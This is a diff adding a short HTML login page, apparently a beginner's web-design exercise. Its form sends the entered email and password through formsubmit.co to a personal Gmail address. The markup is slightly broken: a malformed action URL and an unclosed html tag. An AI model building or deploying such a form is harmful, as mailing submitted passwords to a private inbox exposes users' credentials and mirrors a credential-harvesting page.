@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MyForm</title>
+</head>
+<center>
+<body>
+<h2>MyFormIbrahimWebDesign</h2>
+<form action="https:///formsubmit.co/habarimeshak2005@gmail.com"  method="post" >
+<h3>Login:</h3>
+<input name="email" type="email" placeholder="user email" >
+<br>
+<input name="password" type="password" placeholder="Enter password" >
+<br>
+<button type="submit" >send</button>
+<br>
+<a>Forgot password?</a>
+</form>
+</body>
+</center>
+</html
